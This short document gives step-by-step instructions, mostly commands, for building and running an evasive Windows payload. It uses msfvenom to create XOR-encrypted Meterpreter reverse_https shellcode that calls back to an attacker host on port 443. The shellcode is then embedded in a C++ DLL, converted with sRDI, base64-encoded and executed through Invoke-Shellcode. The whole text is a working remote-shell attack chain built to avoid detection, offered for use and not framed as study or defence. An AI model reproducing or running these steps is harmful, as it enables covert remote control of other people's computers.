Payload creation instructions

1. Generate shellcode
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=443 EXITFUNC=thread -f C --encrypt xor --encrypt-key m
```
2. Paste shellcode into BabyMetal.cpp

3. Compile as DLL
```
g++ -shared BabyMetal.cpp -o BabyMetal.dll
```
4. Convert to shellcode with sRDI

```
Import-Module ConvertTo-Shellcode.ps1
$shellcode = ConvertTo-Shellcode -File .\babymetal.dll -FunctionName BabyMetal
```

5. Convert to base64 and write to file

```
$encoded = [System.Convert]::ToBase64String($shellcode)
Set-Content encoded.txt $encoded
```

6. Execute shellcode
```
Import-Module Invoke-Shellcode.ps1
Invoke-Shellcode -Shellcode $shellcode
```

Note: If you don't have g++, install it with Chocolatey:
```
choco install mingw
```
